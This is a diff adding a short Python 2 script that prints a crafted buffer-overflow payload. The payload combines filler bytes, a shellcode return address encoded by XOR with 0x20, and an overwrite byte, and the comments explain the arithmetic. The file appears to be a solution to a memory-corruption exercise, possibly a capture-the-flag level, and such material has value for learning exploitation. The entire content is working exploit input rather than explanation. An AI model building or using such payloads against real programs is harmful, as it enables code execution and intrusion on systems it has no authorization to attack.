@@ -1,0 +1,13 @@
+#!/usr/bin/env python2
+
+# Here, because the (1 << 5) ^ shell_code_xor_address
+# = "\xa0\xff\xff\xbf".
+shell_code_address = "\x80\xdf\xdf\x9f"
+
+random_address = "\x22"
+
+# Here, because the last byte would calculate
+# by (1 << 5) ^ one_more_byte = "\x14"
+one_more_byte = "\x34"
+
+print(random_address * 4 + shell_code_address * 2 + random_address * 52 + one_more_byte)
